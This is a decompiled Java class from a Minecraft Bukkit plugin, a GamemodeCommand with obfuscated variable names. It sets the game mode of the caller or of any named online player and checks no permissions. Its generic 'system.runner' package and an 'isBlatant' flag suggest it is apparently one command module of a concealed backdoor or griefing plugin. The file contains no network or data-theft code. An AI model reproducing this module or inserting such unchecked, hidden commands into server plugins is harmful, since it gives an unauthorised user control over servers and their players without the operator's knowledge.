/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.GameMode
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class GamemodeCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    public GamemodeCommand() {
        GamemodeCommand lllllllllllllIIlllIIlllIIlllIlIl;
    }

    @Override
    public void execute(Core lllllllllllllIIlllIIlllIIIllIlIl, String lllllllllllllIIlllIIlllIIIllllIl, String[] lllllllllllllIIlllIIlllIIIllllII, Player lllllllllllllIIlllIIlllIIIlllIll) {
        if (lllllllllllllIIlllIIlllIIIllllII.length <= 1) {
            lllllllllllllIIlllIIlllIIIlllIll.sendMessage(Settings.USAGE("gamemode <mode> <player>"));
        } else {
            Player lllllllllllllIIlllIIlllIIlIIIIlI;
            String lllllllllllllIIlllIIlllIIlIIIIIl = lllllllllllllIIlllIIlllIIIllllII[1];
            if (lllllllllllllIIlllIIlllIIIllllII.length >= 3 && (lllllllllllllIIlllIIlllIIlIIIIlI = Bukkit.getServer().getPlayer(lllllllllllllIIlllIIlllIIIllllII[2])) == null) {
                lllllllllllllIIlllIIlllIIIlllIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIIlllIIlllIIIllllII[2]).append(Settings.WHITE).append(" is not online."))));
                return;
            }
            if (lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("creative") || lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("1") || lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("c")) {
                lllllllllllllIIlllIIlllIIIllIlIl.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)lllllllllllllIIlllIIlllIIIllIlIl, () -> {
                    if (lllllllllllllIIlllIIlllIIIllllII.length <= 2) {
                        lllllllllllllIIlllIIlllIIIlllIll.setGameMode(GameMode.CREATIVE);
                        lllllllllllllIIlllIIlllIIIlllIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You set your gamemode to ").append(Settings.RED).append("CREATIVE"))));
                    } else {
                        Player lllllllllllllIIlllIIllIlllIIIIII = Bukkit.getServer().getPlayer(lllllllllllllIIlllIIlllIIIllllII[2]);
                        lllllllllllllIIlllIIllIlllIIIIII.setGameMode(GameMode.CREATIVE);
                        lllllllllllllIIlllIIlllIIIlllIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You set ").append(Settings.RED).append(lllllllllllllIIlllIIllIlllIIIIII.getName()).append("'s ").append(Settings.WHITE).append("gamemode to ").append(Settings.RED).append("CREATIVE"))));
                    }
                });
            } else if (lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("survival") || lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("s") || lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("0")) {
                lllllllllllllIIlllIIlllIIIllIlIl.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)lllllllllllllIIlllIIlllIIIllIlIl, () -> {
                    if (lllllllllllllIIlllIIlllIIIllllII.length <= 2) {
                        lllllllllllllIIlllIIlllIIIlllIll.setGameMode(GameMode.SURVIVAL);
                        lllllllllllllIIlllIIlllIIIlllIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You set your gamemode to ").append(Settings.RED).append("SURVIVAL"))));
                    } else {
                        Player lllllllllllllIIlllIIllIlllIllIII = Bukkit.getServer().getPlayer(lllllllllllllIIlllIIlllIIIllllII[2]);
                        lllllllllllllIIlllIIllIlllIllIII.setGameMode(GameMode.SURVIVAL);
                        lllllllllllllIIlllIIlllIIIlllIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You set ").append(Settings.RED).append(lllllllllllllIIlllIIllIlllIllIII.getName()).append("'s ").append(Settings.WHITE).append("gamemode to ").append(Settings.RED).append("SURVIVAL"))));
                    }
                });
            } else if (lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("spectator") || lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("sp") || lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("3")) {
                lllllllllllllIIlllIIlllIIIllIlIl.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)lllllllllllllIIlllIIlllIIIllIlIl, () -> {
                    if (lllllllllllllIIlllIIlllIIIllllII.length <= 2) {
                        lllllllllllllIIlllIIlllIIIlllIll.setGameMode(GameMode.SPECTATOR);
                        lllllllllllllIIlllIIlllIIIlllIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You set your gamemode to ").append(Settings.RED).append("SPECTATOR"))));
                    } else {
                        Player lllllllllllllIIlllIIllIllllllIII = Bukkit.getServer().getPlayer(lllllllllllllIIlllIIlllIIIllllII[2]);
                        lllllllllllllIIlllIIllIllllllIII.setGameMode(GameMode.SPECTATOR);
                        lllllllllllllIIlllIIlllIIIlllIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You set ").append(Settings.RED).append(lllllllllllllIIlllIIllIllllllIII.getName()).append("'s ").append(Settings.WHITE).append("gamemode to ").append(Settings.RED).append("SPECTATOR"))));
                    }
                });
            } else if (lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("adventure") || lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("a") || lllllllllllllIIlllIIlllIIlIIIIIl.equalsIgnoreCase("2")) {
                lllllllllllllIIlllIIlllIIIllIlIl.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)lllllllllllllIIlllIIlllIIIllIlIl, () -> {
                    if (lllllllllllllIIlllIIlllIIIllllII.length <= 2) {
                        lllllllllllllIIlllIIlllIIIlllIll.setGameMode(GameMode.ADVENTURE);
                        lllllllllllllIIlllIIlllIIIlllIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You set your gamemode to ").append(Settings.RED).append("ADVENTURE"))));
                    } else {
                        Player lllllllllllllIIlllIIlllIIIIlIlll = Bukkit.getServer().getPlayer(lllllllllllllIIlllIIlllIIIllllII[2]);
                        lllllllllllllIIlllIIlllIIIIlIlll.setGameMode(GameMode.ADVENTURE);
                        lllllllllllllIIlllIIlllIIIlllIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You set ").append(Settings.RED).append(lllllllllllllIIlllIIlllIIIIlIlll.getName()).append("'s ").append(Settings.WHITE).append("gamemode to ").append(Settings.RED).append("ADVENTURE"))));
                    }
                });
            }
        }
    }
}

